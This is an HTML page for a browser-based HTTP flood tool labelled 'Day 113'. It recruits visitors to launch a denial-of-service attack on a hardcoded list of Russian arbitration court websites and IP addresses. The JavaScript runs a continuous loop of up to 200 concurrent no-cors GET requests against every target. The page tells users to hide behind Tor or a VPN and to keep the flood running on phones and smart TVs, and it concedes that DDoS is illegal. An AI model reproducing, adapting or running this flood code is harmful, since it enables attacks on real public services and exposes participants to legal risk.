<!doctype html>
<html lang="en">
<style>
/* width */
::-webkit-scrollbar {
  width: 10px;
  overflow: auto;
  height: 0em;
}
/* Track */
::-webkit-scrollbar-track {
  background: #34a8eb;
}
/* Handle */
::-webkit-scrollbar-thumb {
  background: #63c6ff
  ;
}
/* Handle on hover */
::-webkit-scrollbar-thumb:hover {
  background: yellow;
}
.style10 {
	font-size: 9px;
	color: #FFFFFF;
}
</style>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head>
    <title>Day 113 flood</title>
    <link href="https://www.helpukr.xyz/bootstrap.helpukr.css" rel="stylesheet" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" crossorigin="anonymous"></script>
    <script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script> 
	<script> 
		/* Add "https://api.ipify.org?format=json" This method uses ipify.org api to get the clients IP Address. 
		This method is completely free and no limitations of use. */ 
		$.getJSON("https://api.ipify.org?format=json", 
										function(data) { 
			// userip element is where the IP will be displayed
			$("#userip").html(data.ip); 
		}) 
	</script>
	<style> 
		h6 {
		color:white;
		}
	</style>
    <style>
        body {
            padding: 0;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #FFD600;
        }
        .title {
            margin: 3rem auto 3rem auto;
            text-align: center;
            color: #005BBC;
        }
        .intro .howto {
            background-color: #005BBC;
        }
        .intro .howto h3 {
            color: #FFD600;
            text-align: center;
            margin-top: 1rem;
        }
        .intro .howto p {
            color: white;
            text-align: justify;
        }

        .footer {
    color: #005BBC;
    margin-top: 2rem;
    text-align: center;
        }
        .desc{
            color:black;
            padding-top: 2rem;
            padding-bottom: 2rem;
            margin: 0 auto;
            width: 60%;
        }
        .desc h3 {
            text-align: center;
            color: #005BBC;
        }
        #stats h4 {
            font-size: 1.1em;
            text-decoration: underline;
            color: #005BBC;
            font-weight: 400;
        }
        table.status {
            margin-bottom: 10px;
        }
    .style1 {
	color: #CC0000;
	font-weight: bold;
}
.style6 {color: #FF6262}
    .style7 {font-size: 0.1px}
    .style9 {
	color: #FFD600;
	font-weight: bold;
	font-size: 18px;
}
    .style10 {font-size: 24px}
    .style11 {
	font-size: 16px;
	color: #FFFFFF;
} 
    .style13 {
	margin: 3rem auto 3rem auto;
	text-align: center;
	color: #FFD600;
	font-size: 24px;
	font-weight: bold;
}
    .style14 {color: #FFFFFF}
    .style15 {color: #FFFF00}
    .style16 {color: #FF3300}
    .style17 {color: #FF6633}
.style21 {color: #B9DCFF}
    .style22 {color: #ECE3AA}
	table {
  border-color: #fffd9c;
}
    </style>
<body>
    <div class="modal" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
    <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
    <div class="modal-header" style=" padding-bottom: 4px; padding-top: 3px;padding-left: 3px;">
    <h5 id="exampleModalLabel" style=" margin-bottom: 0px;">
	<span class="modal-title style1"><img class="qIBnUc" src="https://i.imgur.com/hwWmsDc.png" draggable="false" width="50px" alt="UKR">&nbsp;Warning: </span><span class="modal-title style6">Read before you continue.&nbsp;<span class="style16"><i>[</span><span class="style17"><b>Day 113</span></b><span class="style16">]</i></span></span></h5></div>
    <div class="modal-body" style=" padding-top: 5px; padding-bottom: 0px;">
    <p style=" margin-bottom: 0px;">As you're likely already aware, the action of DoSing or participating in DDoS is illegal, and for good reason.
Click on continue if you have a VPN Enabled, use a proxy, use the Tor browser or have your own secure connection and wish to support Ukraine in taking down Russian propaganda.</p>
    <hr style=" margin-top: 5px; margin-bottom: 5px;">
    <p>This works by sending GET requests to each targeted website.<br>
       It’s like opening each website at once on your PC and<br>
      re-requesting the data over and over, although the data is not saved or cached, It should be fair to say that your Internet service Provider (ISP) won’t be any more bothered about this than they would you browsing the internet, but its best to stay safe.</p></div>
    <div class="modal-footer">
    <button type="button" class="btn btn-secondary" onClick="window.location.href='https://www.helpukr.xyz'">Leave</button>
    <button type="button" class="btn btn-primary" data-dismiss="exampleModalLabel" onClick="togglePause(); myModal.toggle();">Continue</button></div></div></div></div>
    <table width="100%" border="0" align="center" bgcolor="#005BBC">
      <tr>
        <td bgcolor="#004A9D"><div align="center">
          <table width="200" border="1" style="border-top-width: 0px;">
              <tbody><tr>
                <td><table width="989" border="1" align="left" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-right-width: 0px;">
                  <tbody>
                    <tr>
                      <td width="239" bgcolor="#005BB7"><div align="right"><span class="style14"><strong>&nbsp;Info:</strong> Your Public IP Address is:&nbsp; </span></div></td>
                      <td width="175" bgcolor="#005BB7"><h6 id="userip" style="margin-bottom: 0px;">Loading..</h6></td>
                      <td width="553" bgcolor="#005BB7"><div align="right"><span class="style21">For privacy, download the Tor Browser:</span>&nbsp;<a href="https://www.torproject.org/download/" target="_blank" class="style22" rel="nofollow">https://www.torproject.org/download/</a>&nbsp;&nbsp;&nbsp;</div></td>
                    </tr>
                  </tbody>
                </table></td>
              </tr>
            </tbody></table>
          <p class="style13" style="margin-top: 0px;margin-bottom: 0px;">          Propaganda http(s) flood  for <span class="style15">Day 113 </span>using targets from the IT Army of Ukraine.        </p>
        </div></td>
      </tr><tr>
        <td bgcolor="#0057B7"><div align="center" class="style9 style10">
          <h3><u>Information about this tool.</u></h3>
        </div></td>
      </tr><tr>
        <td><table width="90%" border="0" align="center">
          <tr>
            <td align="center"><p class="style11">This tool is hosted via <a href="https://pages.github.com/" target="_blank" class="align-content-sm-between"><a href="https://pages.github.com/" target="_blank" class="style15">GitHub Page</a>, You can download it for local use and customization <a href="https://raw.githubusercontent.com/helpukr/helpukr.github.io/main/day113.htm" target="_blank" class="style15">here</a>. A new page will be added for each day,  with a new set of targets   from the Ukrainian IT Army's telegram servers.</p>
              <p class="style11">All of the news in the Russian federation is  fake and need to be shut down, we need as many people as possible to help. Just a tiny 1kbps of data could be the edge needed to take down a server hosting propaganda. <br>
                <br>
                Just open this page and leave it running on your devices as long as possible, it will flood targets selected specifically for that day.<br>
                Targets are
chosen by an intelligence team who are always looking at what services are aiding Russia’s war,
together we can pose a huge load on their infrastructure.</p>
              <details>
              <summary><span style="color: #ffff99;">Click Here for <b>FAQ</b> <i>(Questions & Answers)</i></span></summary>
  <p><table width="100%" border="0">
              <tbody>
                <tr>
                  <td><hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"><p class="style11">FAQ:<br>
                    <span style="color: #ffff99;"><strong>Q)</strong></span> How can I use this in the tor browser if HTTPS overrides HTTP no matter what i try?<br>
                    <span style="color: #ffff99;"><strong>A)</strong></span> Download the page for local use, it won't use any http/https protocols because those are used to request files from a web server, but using it locally (directly from your computer) bypasses the need and allows you to flood both HTTP and HTTPS from your TOR Browser's IP.</p>
                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> How can I see what's happening in more detail?<br>
                      <span style="color: #ffff99;"><strong>A)</strong></span> 
                      open the developer console by pressing F12 and select the Network Tab.<br>
                      If you're on a mac you can't use     F12 for this, instead right click anywhere on the site and click inspect, then click the network tab </p>
                    <p class="style11" style="margin-bottom: 0px;"><span style="color: #ffff99;"><strong>Q)</strong></span> After so much time has passed, my browser/computer become very laggy and unresponsive or my browser crashes, how can I fix this?<br>
                      <span style="color: #ffff99;"><strong>A)</strong></span> This happens because everything that happens is logged by the browser, but you can stop it pretty easily.<br>
                      In the Network tab on the developer console (F12), press both the red button and the stop symbol. </p>
                    <details style="margin-bottom: 16px;">
                      <summary><span style="color: #ffff99;">Click Here to see Example</span></summary>
                      <img src="https://i.imgur.com/5Cw6kai.png" draggable="false"> </details>
                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> Why are some of the requests having the same number error after a while?<br>
                      <span style="color: #ffff99;"><strong>A)</strong></span> 
                      This is likely caused by the IP of the VPN you're using has been blocked on their side, but it could also mean the site's just totally overloaded and cannot respond to any requests.<br>
                  Also if you’re are using https:// in the address bar that would cause the http:// addresses to do the same</p></td>
                </tr>
              </tbody>
            </table></p>
</details>
            <hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"></td>
          </tr>
        </table>
          <table width="613" border="0" align="center">
            <tr>
              <td width="607"><h3 align="center" class="style14">Session Status</h3>
                <p align="center" class="style14" style=" margin-bottom: 0px; padding-bottom: 2px;">Below is a log of sites that ether responded with errors or failed to respond at all.<br>
                  It’s normal for this number to count up slow or fast and can often change.<br>
                  If a lot of services are overloaded the numbers will go fast, else they’ll go slower.<br>
If all requests are the same as all errors on some sites, it most likely means that the<br>
site operator has banned the IP you’re using. </p>
              </td>
            </tr>
          </table>
	    </td>
      </tr>
    </table>
<div class="desc text-center" style=" padding-top: 4px;">
  <p align="center" class="style7" style=" margin-bottom: 0px;">Total number of requests: <span id="totalrequests">0</span></p>
  <p>      So far <span id="totalerrors"><em>zero</em></span> sites have responded with errors</p>
<button type="button" class="btn btn-primary" onClick="togglePause();" style=" padding-left: 32px; padding-right: 32px; padding-top: 8px; padding-bottom: 8px;">Resume</button>
</div>
<div id="stats" class="container">
        <div class="row">
        </div>
</div>
<p class="footer">This website is an easy to run solution to flooding Russian propaganda via any internet capable device with a browser.<br>
      For example you can walk around town shopping and flood Russian propaganda from a phone in your pocket.<br>
      It can even be used via the browser app on a Smart TV in the background whilst you watch TV.<br>
      With your help you can convince a Russian to rebel agents the war by making them<br>
      look elsewhere for news, remember, Nothing you do is too little!<br>
Glory to Ukraine, Glory to the hero’s. 
<br>
<br><center>
  <div id="betabox" style="text-align: center"><span class="footer"><strong><span style="color:#009999"><em><u>Beta Feature:</u></em></span></strong> Estimated data requested from servers
via GET:&nbsp;<span class="number-counter" data-count-from="0" data-count-to="100000000000" data-count-speed="0.0085">0</span>MB (MegaBytes)</span></div></center>
<style>#betabox {
  padding: 1px ;
  border-top: 1px solid #3498db;
  border-right: 1px solid #3498db;
  background-color: #FFE248;
  line-height: 110%;
  border-left: 1px solid #3498db;
  align-content: center;
  align-self: 4px ;
  width: 620px ;
}</style>
<script>        
        // target list
        var urls = [
        // We add the resources of arbitration courts to the list of targets. Also do not forget that the St. Petersburg "international" economic forum runs until June 18, so continue to "visit" it.
            'http://fasszo.arbitr.ru/',
            'http://5.61.15.75:80',
            'https://5.61.15.75:443',
            'https://5.61.15.75:3306',
            'https://1aas.arbitr.ru/',
            'http://31.31.198.208:80',
            'https://31.31.198.208:443',
            'https://31.31.198.208:3306',
            'https://2aas.arbitr.ru/',
            'http://92.39.69.234:80',
            'https://92.39.69.234:443',
            'http:/irkutsk.arbitr.ru/',
            'http://95.213.207.77:80',
            'http://fasvvo.arbitr.ru/',
            'http://fasvso.arbitr.ru/',
            'http://fasdvo.arbitr.ru/',
            'http://faszso.arbitr.ru/',
            'http://fasmo.arbitr.ru/',
            'http://faspo.arbitr.ru/',
            'http://fassko.arbitr.ru/',
            'http://fasuo.arbitr.ru/',
            'http://fasco.arbitr.ru/',
            'http://3aas.arbitr.ru/',
            'http://4aas.arbitr.ru/',
            'http://5aas.arbitr.ru/',
            'http://6aas.arbitr.ru/',
            'http://7aas.arbitr.ru/',
            'http://8aas.arbitr.ru/',
            'http://9aas.arbitr.ru/',
            'http://10aas.arbitr.ru/',
            'http://11aas.arbitr.ru/',
            'http://12aas.arbitr.ru/',
            'http://13aas.arbitr.ru/',
            'http://14aas.arbitr.ru/',
            'http://15aas.arbitr.ru/',
            'http://16aas.arbitr.ru/',
            'http://17aas.arbitr.ru/',
            'http://18aas.arbitr.ru',
            'http://19aas.arbitr.ru/',
            'http://20aas.arbitr.ru/',
            'http://21aas.arbitr.ru/',
            'http://altai-krai.arbitr.ru/',
            'http://amuras.arbitr.ru/',
            'http://arhangelsk.arbitr.ru/',
            'http://astrahan.arbitr.ru/',
            'http://belgorod.arbitr.ru/',
            'http://bryansk.arbitr.ru/',
            'http://vladimir.arbitr.ru/',
            'http://volgograd.arbitr.ru/',
            'http://vologda.arbitr.ru/',
            'http://voronej.arbitr.ru/',
            'http://msk.arbitr.ru/',
            'http://spb.arbitr.ru/',
            'http://sevastopol.arbitr.ru/',
            'http://eao.arbitr.ru/',
            'http://chita.arbitr.ru/',
            'http://ivanovo.arbitr.ru/',
            'http://askb.arbitr.ru/',
            'http://kaliningrad.arbitr.ru/',
            'http://kaluga.arbitr.ru/',
            'http://kamchatka.arbitr.ru/',
            'http://askchr.arbitr.ru/',
            'http://kemerovo.arbitr.ru/',
            'http://kirov.arbitr.ru/',
            'http://kostroma.arbitr.ru/',
            'http://krasnodar.arbitr.ru/',
            'http://krasnoyarsk.arbitr.ru/',
            'http://kurgan.arbitr.ru/',
            'http://kursk.arbitr.ru/',
            'http://lipetsk.arbitr.ru/',
            'http://magadan.arbitr.ru/',
            'http://asmo.arbitr.ru/',
            'http://murmansk.arbitr.ru/',
            'http://nnov.arbitr.ru/',
            'http://novgorod.arbitr.ru/',
            'http://novosib.arbitr.ru/',
            'http://omsk.arbitr.ru/',
            'http://orenburg.arbitr.ru/',
            'http://orel.arbitr.ru/',
            'http://penza.arbitr.ru/',
            'http://perm.arbitr.ru/',
            'http://primkray.arbitr.ru/',
            'http://pskov.arbitr.ru/',
            'http://www.perm.arbitr.ru/',
            'http://arhangelsk.arbitr.ru/',
            'http://adyg.arbitr.ru/',
            'http://altai.arbitr.ru/',
            'http://ufa.arbitr.ru/',
            'http://buryatia.arbitr.ru/',
            'http://mahachkala.arbitr.ru/',
            'http://ingushetia.arbitr.ru/',
            'http://kalmyk.arbitr.ru/',
            'http://karelia.arbitr.ru/',
            'http://komi.arbitr.ru/',
            'http://crimea.arbitr.ru/',
            'http://mari-el.arbitr.ru/',
            'http://asrm.arbitr.ru/',
            'http://yakutsk.arbitr.ru/',
            'http://alania.arbitr.ru/',
            'http://tatarstan.arbitr.ru/',
            'http://tyva.arbitr.ru/',
            'http://khakasia.arbitr.ru/',
            'http://rostov.arbitr.ru/',
            'http://ryazan.arbitr.ru/',
            'http://samara.arbitr.ru/',
            'http://saratov.arbitr.ru/',
            'http://sakhalin.arbitr.ru/',
            'http://ekaterinburg.arbitr.ru/',
            'http://smolensk.arbitr.ru/',
            'http://stavropol.arbitr.ru/',
            'http://tambov.arbitr.ru/',
            'http://tver.arbitr.ru/',
            'http://tomsk.arbitr.ru/',
            'http://tula.arbitr.ru/',
            'http://tumen.arbitr.ru/',
            'http://udmurtiya.arbitr.ru/',
            'http://ulyanovsk.arbitr.ru/',
            'http://khabarovsk.arbitr.ru/',
            'http://hmao.arbitr.ru/',
            'http://chel.arbitr.ru/',
            'http://chechnya.arbitr.ru/',
            'http://chuvashia.arbitr.ru/',
            'http://chukotka.arbitr.ru/',
            'http://yamal.arbitr.ru/',
            'http://yaroslavl.arbitr.ru/',
            'http://ipc.arbitr.ru/',
            'http://212.164.138.171:80',
            'http://212.164.138.173:80',
        ];
        // initialize variables
        var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
        var statRow = document.querySelector("#stats > .row");
        var myModal = new bootstrap.Modal(document.getElementById('exampleModal'), {});
        var CONCURRENCY_LIMIT = 200;
        var queue = [];
        var attack = false;
        var totalrequests = 0;
        var totalerrors = 0;
        function togglePause () {
            if (attack) {
                attack = false;
                document.querySelector("div.desc .btn").innerText = "Resume";
            } else {
                attack = true;
                document.querySelector("div.desc .btn").innerText = "Pause";
                for (var i=0; i<urls.length; i++) {
                    flood(i);
                }
            }
        }
        async function fetchWithTimeout(resource, options) {
            const controller = new AbortController();
            const id = setTimeout(() => controller.abort(), options.timeout);
            return fetch(resource, {
                signal: controller.signal,
                mode: 'no-cors'
            }).then((response) => {
                clearTimeout(id);
                return response;
            }).catch((error) => {
                clearTimeout(id);
                throw error;
            });
        }
        async function sleep(ms) {
            return new Promise(r => setTimeout(r, ms));
        }         
        async function flood(n) {
            const url = urls[n];
            const target = targets[url];
            while (attack) {
                if (queue.length > CONCURRENCY_LIMIT) {
                    await queue.shift();
                }
                queue.push(
                    fetchWithTimeout(url, { timeout: 2000 })
                        .catch((error) => {
                            if (error.code === 20 /* ABORT */) {
                                return;
                            }
                            target.number_of_errored_responses++;
                            target.error_message = error.message;
                            totalerrors++;
                        })
                        .then((response) => {
                            if (response && !response.ok) {
                                target.number_of_errored_responses++;
                                target.error_message = response.statusText;
                                totalerrors++;
                            }
                            target.number_of_requests++;
                        })
                        .finally(() => updateTargetDisplay(n))
                );
                await sleep(1);
            }
        }
        // Update data for target n
        function updateTargetDisplay(n) {
            var url = urls[n];
            var {number_of_requests, number_of_errored_responses} = targets[url];
            var requests_cell = document.querySelector(`#target${n} .requests`);
            var errors_cell = document.querySelector(`#target${n} .errors`);
            requests_cell.innerText = number_of_requests;
            errors_cell.innerText = number_of_errored_responses;
            document.querySelector("#totalrequests").innerText = totalrequests;
            document.querySelector("#totalerrors").innerText = totalerrors;
        }
        // Shuffle array order before starting
        for (let i = urls.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [urls[i], urls[j]] = [urls[j], urls[i]];
        }
        // Create div for each target
        for (var i=0; i<urls.length; i++) {
            statRow.innerHTML += `
                <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
                  <h4>${urls[i]}</h4>
                    <table class='status'>
                      <tr><td>requests:</td><td class="requests">0</td></tr>
                      </tr><td>errors:</td><td class="errors">0</td></tr>
                    </table>
                  </div>
            `;
        }
        // Show warning window
        myModal.toggle();
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-85513613-1');
</script>
<script>
// BETA plugin for estimated requested data
(function($) {
  $.fn.countTo = function(options) {
    return this.each(function() {
      //-- Arrange
      var FRAME_RATE = 60; // Predefine default frame rate to be 60fps
      var $el = $(this);
      var countFrom = parseInt($el.attr('data-count-from'));
      var countTo = parseInt($el.attr('data-count-to'));
      var countSpeed = $el.attr('data-count-speed'); // Number increment per second

      //-- Action
      var rafId;
      var increment;
      var currentCount = countFrom;
      var countAction = function() {              // Self looping local function via requestAnimationFrame
        if(currentCount < countTo) {              // Perform number incremeant
          $el.text(Math.floor(currentCount));     // Update HTML display
          increment = countSpeed / FRAME_RATE;    // Calculate increment step
          currentCount += increment;              // Increment counter
          rafId = requestAnimationFrame(countAction);
        } else {                                  // Terminate animation once it reaches the target count number
          $el.text(countTo);                      // Set to the final value before everything stops
          //cancelAnimationFrame(rafId);
        }
      };
      rafId = requestAnimationFrame(countAction); // Initiates the looping function
    });
  };
}(jQuery));

//-- Executing
$('.number-counter').countTo();
</script>
</html>
